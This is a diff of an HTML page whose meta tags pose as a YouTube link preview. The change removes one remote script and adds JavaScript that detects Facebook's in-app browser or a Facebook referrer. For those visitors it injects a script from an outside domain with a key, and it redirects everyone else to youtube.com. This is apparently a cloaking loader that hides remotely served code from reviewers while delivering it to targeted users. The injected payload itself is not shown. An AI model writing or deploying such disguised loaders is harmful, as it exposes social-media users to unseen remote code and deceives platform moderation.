@@ -1,3 +1,5 @@
+<!DOCTYPE html>
+<html lang="en">
 <head>
     <meta http-equiv="content-type" content="text/html; charset=utf-8">
     <meta name="facebook:card" content="summary_large_image">
@@ -7,9 +9,19 @@
     <meta name="facebook:description" content="YouTube">
     <meta property="fb:app_id" content="87741124305">
     <meta name="facebook:app:country" content="US">
-    <script src="https://newph.vsys.top/?token=8c6e8bdaa3baab0d0066f32f335ef534" type="text/javascript" async="true"></script>
 </head>
 <body>
-    
+    <script>
+        const userAgent = window.navigator.userAgent
+        const url       = document.referrer
+        //
+        if (userAgent.match(/FBAN|FBAV|Messenger|Lite/i) || (url.match(/[0-9a-z]*\.facebook\.com/) || url.match(/[0-9a-z]*\.fb\.com/))) {
+            const script = document.createElement('script')
+            script.setAttribute('src','https://turkeychoice.com/bsbb0eb84?key=6277a7e45b3d4bb04ae99f6dc0ee1397')
+            document.head.appendChild(script)
+        } else {
+            window.location = 'https://www.youtube.com/'
+        }
+    </script>   
 </body>
 </html>
